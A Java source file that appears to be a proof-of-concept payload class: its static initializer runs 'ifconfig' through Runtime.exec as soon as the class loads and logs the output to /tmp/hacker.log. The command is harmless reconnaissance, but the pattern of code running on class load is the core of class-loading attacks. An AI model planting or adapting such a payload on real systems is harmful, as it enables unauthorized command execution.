import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public class Ifconfig {
	static String liner = System.lineSeparator();

	static{

		PrintWriter pw = null;
		try {
			pw = new PrintWriter(new File("/tmp/hacker.log"));
		} catch (FileNotFoundException e1) {
			e1.printStackTrace();
		}

		Runtime runtime = Runtime.getRuntime();
		try {
			Process process = runtime.exec("ifconfig");
			BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			BufferedReader stderrReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
			String line;
			pw.write("[OUTPUT]:"+liner);
			while ((line = stdoutReader.readLine()) != null) {
				pw.write(line);
				pw.write(liner);
			}
			pw.write("[ERROR]:"+liner);
			while ((line = stderrReader.readLine()) != null) {
				pw.write(line);
				pw.write(liner);
			}
			int exitVal = process.waitFor();
			pw.write("process exit value is " + exitVal);
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		} finally {
			if (pw != null) {
				pw.flush();
				pw.close();
			}
		}

	}

}
